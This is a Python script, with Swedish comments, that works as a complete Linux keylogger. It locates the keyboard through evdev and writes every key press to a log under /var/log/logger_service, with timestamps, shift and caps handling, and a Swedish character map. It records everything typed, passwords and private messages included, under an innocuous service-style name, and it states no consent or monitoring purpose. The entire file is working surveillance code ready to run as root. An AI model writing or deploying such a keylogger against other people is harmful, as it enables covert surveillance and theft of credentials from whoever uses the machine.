import evdev
from evdev import InputDevice, categorize, ecodes
from datetime import datetime
import os
import sys

# NY SÖKVÄG: Mappen måste skapas först med 'sudo mkdir /var/log/logger_service'
LOG_FILE = '/var/log/logger_service/key_history.log'

# Automatisk sökning efter tangentbords-enheten
def find_keyboard():
    devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
    for device in devices:
        if 'keyboard' in device.name.lower():
            return device.path
    return None

# Mappningar för svenska tecken
swedish_map = {
    'KEY_LEFTBRACE': ('å', 'Å'),
    'KEY_APOSTROPHE': ('ä', 'Ä'),
    'KEY_SEMICOLON': ('ö', 'Ö'),
    'KEY_COMMA': (',', ';'),
    'KEY_DOT': ('.', ':'),
    'KEY_MINUS': ('+', '?'),
    'KEY_EQUAL': ('´', '`'),
    'KEY_SLASH': ('-', '_'),
    'KEY_1': ('1', '!'),
    'KEY_2': ('2', '"'),
    'KEY_3': ('3', '#'),
    'KEY_4': ('4', '¤'),
    'KEY_5': ('5', '%'),
    'KEY_6': ('6', '&'),
    'KEY_7': ('7', '/'),
    'KEY_8': ('8', '('),
    'KEY_9': ('9', ')'),
    'KEY_0': ('0', '='),
}

special_keys = {
    'KEY_SPACE': ' ',
    'KEY_ENTER': '\n[ENTER]\n',
    'KEY_BACKSPACE': '[BACKSPACE]',
    'KEY_TAB': '\t',
}

def main():
    device_path = find_keyboard()
    if not device_path or not os.path.exists(device_path):
        print("Inget tangentbord hittades.")
        return

    try:
        dev = InputDevice(device_path)
        shift_pressed = False
        caps_lock = False
        last_time = 0

        # Kontrollera att vi kan skriva till filen innan vi startar loopen
        if not os.path.exists(os.path.dirname(LOG_FILE)):
            print(f"Fel: Mappen {os.path.dirname(LOG_FILE)} finns inte!")
            return

        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"\n\n--- System Start: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")

            for event in dev.read_loop():
                if event.type == ecodes.EV_KEY:
                    key_event = categorize(event)
                    key_name = key_event.keycode

                    if key_name in ['KEY_LEFTSHIFT', 'KEY_RIGHTSHIFT']:
                        shift_pressed = (key_event.keystate == key_event.key_down)
                        continue

                    if key_name == 'KEY_CAPSLOCK' and key_event.keystate == key_event.key_down:
                        caps_lock = not caps_lock
                        continue

                    if key_event.keystate == key_event.key_down:
                        current_time = event.timestamp()
                        # Lägg till tidsstämpel om det var mer än 5 sekunder sedan förra trycket
                        if current_time - last_time > 5:
                            f.write(datetime.now().strftime('\n[%H:%M:%S] -> '))
                        last_time = current_time

                        if key_name in special_keys:
                            f.write(special_keys[key_name])
                        elif isinstance(key_name, str):
                            upper = shift_pressed ^ caps_lock
                            clean_name = key_name.replace('KEY_', '')

                            if key_name in swedish_map:
                                low, high = swedish_map[key_name]
                                f.write(high if shift_pressed else low)
                            elif len(clean_name) == 1:
                                char = clean_name.upper() if upper else clean_name.lower()
                                f.write(char)
                            else:
                                f.write(f"[{clean_name}]")
                        f.flush() # Tvingar texten till filen direkt
    except PermissionError:
        print("Rättighetsfel: Kör med sudo eller fixa behörighet på /var/log/logger_service")
    except Exception as e:
        print(f"Ett fel uppstod: {e}")

if __name__ == "__main__":
    main()
